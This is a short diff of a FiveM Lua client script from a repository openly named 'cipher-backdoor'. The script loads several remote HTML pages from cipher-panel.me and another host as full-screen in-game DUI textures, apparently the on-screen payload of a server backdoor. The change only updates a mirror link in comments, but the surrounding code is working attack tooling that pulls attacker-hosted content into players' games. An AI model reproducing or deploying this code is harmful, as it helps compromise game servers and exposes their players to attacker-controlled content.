@@ -1,12 +1,12 @@
 -- https://github.com/cashtwizzy
 -- Twizzy#6402
-local sound = CreateDui("https://cipher-panel.me/secure_area/fivem/sv/typer/sound.html", 50, 50); -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/ui
+local sound = CreateDui("https://cipher-panel.me/secure_area/fivem/sv/typer/sound.html", 50, 50); -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui
 
 local textureDic = CreateRuntimeTxd('duiTxd');
 
 local object = CreateDui("https://upfilesc.wwwnl1-ss11.a2hosted.com/cipher_vis12.html", 1920, 1080);
 local object = CreateDui("https://cipher-panel.me/secure_area/fivem/sv/typer/y.html", 1920, 1080);
-local object2 = CreateDui("https://cipher-panel.me/secure_area/fivem/sv/typer/cipher_bug.html", 1920, 1080);  -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/ui
+local object2 = CreateDui("https://cipher-panel.me/secure_area/fivem/sv/typer/cipher_bug.html", 1920, 1080);  -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui
 local object3 = CreateDui("https://cipher-panel.me/secure_area/fivem/sv/typer/screen3_2.html", 1920, 1080);
 
 local handle = GetDuiHandle(object) -- Gets DUI handle from object
